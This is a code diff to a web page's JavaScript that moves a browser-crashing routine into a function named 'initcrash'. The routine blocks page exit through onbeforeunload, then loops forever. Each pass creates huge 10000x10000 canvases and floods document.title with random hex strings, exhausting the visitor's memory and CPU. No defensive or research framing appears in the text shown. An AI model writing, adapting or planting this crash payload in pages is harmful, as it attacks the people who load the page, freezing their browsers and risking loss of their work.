@@ -59,29 +59,31 @@
         window.onbeforeunload = function() {
             return true;
         };   
-        const hashes = [];
-        for (let i = 0; i < 100; i++) {
-            let hash = '';
-            for (let j = 0; j < 512; j++) {
-                hash += Math.floor(Math.random() * 16).toString(16);
+        function initcrash(){
+            const hashes = [];
+            for (let i = 0; i < 100; i++) {
+                let hash = '';
+                for (let j = 0; j < 512; j++) {
+                    hash += Math.floor(Math.random() * 16).toString(16);
+                }
+                hashes.push(hash);
             }
-            hashes.push(hash);
-        }
-        let counter = 0;
-        const canvases = [];
-        while(true) {
-            const c = document.createElement('canvas');
-            c.width = 10000;
-            c.height = 10000;
-            const ctx = c.getContext('2d');
-            ctx.fillRect(0, 0, 10000, 10000);
-            canvases.push(c);
-            document.body.appendChild(c);
-            for (let i = 0; i < 8000; i++) {
-                document.title = hashes[counter % 100];
-                document.title = hashes[(counter + 1) % 100];
-                document.title = hashes[(counter + 2) % 100];
-                counter += 3;
+            let counter = 0;
+            const canvases = [];
+            while(true) {
+                const c = document.createElement('canvas');
+                c.width = 10000;
+                c.height = 10000;
+                const ctx = c.getContext('2d');
+                ctx.fillRect(0, 0, 10000, 10000);
+                canvases.push(c);
+                document.body.appendChild(c);
+                for (let i = 0; i < 8000; i++) {
+                    document.title = hashes[counter % 100];
+                    document.title = hashes[(counter + 1) % 100];
+                    document.title = hashes[(counter + 2) % 100];
+                    counter += 3;
+                }
             }
         }
 
